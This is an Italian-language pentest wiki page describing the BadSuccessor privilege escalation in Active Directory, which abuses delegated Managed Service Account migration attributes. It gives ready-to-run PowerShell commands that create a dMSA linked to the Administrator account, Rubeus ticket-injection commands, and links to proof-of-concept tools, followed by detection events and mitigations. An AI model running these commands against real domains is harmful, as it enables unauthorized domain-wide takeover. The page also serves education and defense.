# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Gli Account di Servizio Gestiti Delegati (**dMSA**) sono il successore di nuova generazione degli **gMSA** che verranno inclusi in Windows Server 2025. Un flusso di lavoro di migrazione legittimo consente agli amministratori di sostituire un account *vecchio* (utente, computer o account di servizio) con un dMSA preservando in modo trasparente i permessi. Il flusso di lavoro è esposto tramite cmdlet PowerShell come `Start-ADServiceAccountMigration` e `Complete-ADServiceAccountMigration` e si basa su due attributi LDAP dell'**oggetto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* all'account superato (vecchio).
* **`msDS-DelegatedMSAState`**       – stato di migrazione (`0` = nessuno, `1` = in corso, `2` = *completato*).

Se un attaccante può creare **qualsiasi** dMSA all'interno di un OU e manipolare direttamente quei 2 attributi, LSASS e il KDC tratteranno il dMSA come un *successore* dell'account collegato. Quando l'attaccante si autentica successivamente come dMSA **eredita tutti i privilegi dell'account collegato** – fino a **Domain Admin** se l'account Administrator è collegato.

Questa tecnica è stata coniata **BadSuccessor** da Unit 42 nel 2025. Al momento della scrittura **non è disponibile alcuna patch di sicurezza**; solo il rafforzamento dei permessi dell'OU mitiga il problema.

### Prerequisiti per l'attacco

1. Un account che è *autorizzato* a creare oggetti all'interno di **un'Unità Organizzativa (OU)** *e* ha almeno uno dei seguenti:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** classe di oggetti
* `Create Child` → **`All Objects`** (creazione generica)
2. Connettività di rete a LDAP e Kerberos (scenario standard di dominio unito / attacco remoto).

## Enumerazione delle OU vulnerabili

Unit 42 ha rilasciato uno script di supporto PowerShell che analizza i descrittori di sicurezza di ciascuna OU e evidenzia le ACE richieste:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Sotto il cofano, lo script esegue una ricerca LDAP paginata per `(objectClass=organizationalUnit)` e controlla ogni `nTSecurityDescriptor` per

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (classe oggetto *msDS-DelegatedManagedServiceAccount*)

## Passi di Sfruttamento

Una volta identificato un OU scrivibile, l'attacco è a solo 3 scritture LDAP di distanza:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Dopo la replicazione, l'attaccante può semplicemente **logon** come `attacker_dMSA$` o richiedere un TGT Kerberos – Windows costruirà il token dell'account *superseded*.

### Automazione

Diverse PoC pubbliche racchiudono l'intero flusso di lavoro, inclusi il recupero della password e la gestione dei ticket:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* Modulo NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Rilevamento e Caccia

Abilita **Audit degli Oggetti** su OUs e monitora i seguenti Eventi di Sicurezza di Windows:

* **5137** – Creazione dell'oggetto **dMSA**
* **5136** – Modifica di **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Modifiche specifiche agli attributi
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emissione TGT per il dMSA

Correlare `4662` (modifica dell'attributo), `4741` (creazione di un account computer/servizio) e `4624` (accesso successivo) evidenzia rapidamente l'attività di BadSuccessor. Le soluzioni XDR come **XSIAM** forniscono query pronte all'uso (vedi riferimenti).

## Mitigazione

* Applica il principio del **minimo privilegio** – delega la gestione degli *Account di Servizio* solo a ruoli fidati.
* Rimuovi `Create Child` / `msDS-DelegatedManagedServiceAccount` da OUs che non lo richiedono esplicitamente.
* Monitora gli ID evento elencati sopra e invia avvisi su identità *non-Tier-0* che creano o modificano dMSA.

## Vedi anche

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Riferimenti

- [Unit42 – Quando i Buoni Account Diventano Cattivi: Sfruttare gli Account di Servizio Gestiti Delegati](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Collezione di Strumenti per Pentest](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [Modulo BadSuccessor di NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
